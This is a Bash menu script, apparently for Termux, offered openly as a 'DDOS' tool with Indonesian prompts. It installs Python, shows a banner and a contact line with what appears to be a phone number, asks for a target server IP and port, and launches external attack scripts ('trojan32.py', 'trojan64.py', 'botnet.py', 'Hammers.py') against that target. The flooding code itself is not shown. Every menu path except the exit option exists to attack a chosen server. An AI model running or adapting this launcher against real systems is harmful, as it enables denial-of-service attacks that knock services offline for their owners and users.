##################
##################
#colors
blue='\e[1;34m'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
grey="\033[0;37m"
purple="\033[0;35m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
mon="mon"
lightcyan='\e[96m'
white='\e[1;37m'
nc="\e[0m"
red='\e[1;31m'
yellow='\e[1;33m'
clear
#load  
load(){
clear
echo -e $red "MENGHUBUNGKAN..."
sleep 0.25
clear
echo -e $blue "MENGHUBUNGKAN..."
sleep 0.25
clear
echo -e $red "MENGHUBUNGKAN..."
sleep 0.25
clear
echo -e $blue "MENGHUBUNGKAN..."
sleep 0.25
clear
echo -e $red "MENGHUBUNGKAN..."
sleep 0.25        
}
#Banner
baner(){
    echo -e $green "         __         ____            "
    sleep 0.25
    echo -e $green "   _____/ /____  __/ __ \____  _____"
    sleep 0.25
    echo -e $green "  / ___/ //_/ / / / / / / __ \/ ___/"
    sleep 0.25
    echo -e $green " (__  ) ,< / /_/ / /_/ / /_/ (__  )" 
    sleep 0.25
    echo -e $green "/____/_/|_|\__, /_____/\____/____/ " 
    sleep 0.25
    echo -e $green "          /____/                    "
    sleep 0.25
}
#install
install(){
    echo -e $cyan"Menunggu sampai Selesai"
    pkg install python -y
    sleep 0.25
    clear
    pkg install python2 -y
    sleep 0.25
    clear
    pkg install python3 -y
    sleep 0.25
    clear
}
install
load
baner
echo ""
echo -e $red "   WELCOME TO MY TOOLS DDOS  "
sleep 0.25
echo -e $white "||==========================||"
sleep 0.25
echo -e $red "||====Author : Tampansky====||"
sleep 0.25
echo -e $white "||==CONTACT : 087887986528==||"
sleep 0.25
echo -e $red "||=====Script DDOs V.Max====||  "
sleep 0.25
echo -e $white "||====Thanks : Allah SWT====||"
sleep 0.25
echo -e $red "||==========================||"
sleep 0.25
echo ""
sleep 0.25
echo ""
echo -e $white "||======================||"
echo -e $red "|| 1.DDos Trojan32      ||"
echo -e $white "|| 2.DDos Trojan64      ||"
echo -e $red "|| 3.DDos BotNet        ||"
echo -e $white "|| 4.DDos Hammers       ||"
echo -e $red "|| 5. Keluar/OUT        ||"
echo -e $white "||----------------------||"
read -p "$cyan[PILIH}" dos 
case $dos in 
("1")
load
baner
echo -e $red "Massukan server ip"
read -p "$cyan[IP}" pi 
echo ""
echo -e $white "Massukan port" 
read -p "$cyan[PORT}" rot
echo ""
load
echo -e "menghubungkan..."
sleep 1
python trojan32.py -s $pi -p $rot -t 135
;; 
("2")
load
baner
echo -e $red "Massukan server ip"
read -p "$cyan[IP}" pi 
echo ""
echo -e $white "Massukan port" 
read -p "$cyan[PORT}" rot
echo ""
load
echo -e "menghubungkan..."
sleep 1
python trojan64.py -s $pi -p $rot -t 135
;;
("3")
load
baner
echo -e $red "Massukan server ip"
read -p "$cyan[IP}" pi 
echo ""
echo -e $white "Massukan port" 
read -p "$cyan[PORT}" rot
echo ""
load
echo -e "menghubungkan..."
sleep 1
python botnet.py -s $pi -p $rot -t 135
;;
("4")
load
baner
echo -e $red "Massukan server ip"
read -p "$cyan[IP}" pi 
echo ""
echo -e $white "Massukan port" 
read -p "$cyan[PORT}" rot
echo ""
load
echo -e "menghubungkan..."
sleep 1
python Hammers.py -s $pi -p $rot -t 135
;;
("5")
load
load
echo -e $cyan "Thanks To Used My Tools"
;;
esac